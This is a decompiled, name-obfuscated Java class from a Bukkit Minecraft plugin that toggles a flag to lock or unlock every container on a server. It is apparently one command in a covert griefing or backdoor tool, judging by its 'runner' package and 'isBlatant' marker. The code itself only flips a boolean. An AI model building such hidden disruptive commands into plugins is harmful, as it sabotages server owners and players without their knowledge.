/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class LockcontainersCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return true;
    }

    public LockcontainersCommand() {
        LockcontainersCommand lllllllllllllIllIlIIIIIlIllllllI;
    }

    @Override
    public void execute(Core lllllllllllllIllIlIIIIIlIlllIlIl, String lllllllllllllIllIlIIIIIlIllllIII, String[] lllllllllllllIllIlIIIIIlIlllIlll, Player lllllllllllllIllIlIIIIIlIlllIllI) {
        if (lllllllllllllIllIlIIIIIlIlllIlIl.storagesDisabled) {
            lllllllllllllIllIlIIIIIlIlllIlIl.storagesDisabled = false;
            lllllllllllllIllIlIIIIIlIlllIllI.sendMessage(Settings.PREFIX("All containers are now unlocked"));
        } else {
            lllllllllllllIllIlIIIIIlIlllIlIl.storagesDisabled = true;
            lllllllllllllIllIlIIIIIlIlllIllI.sendMessage(Settings.PREFIX("All containers are now locked"));
        }
    }
}

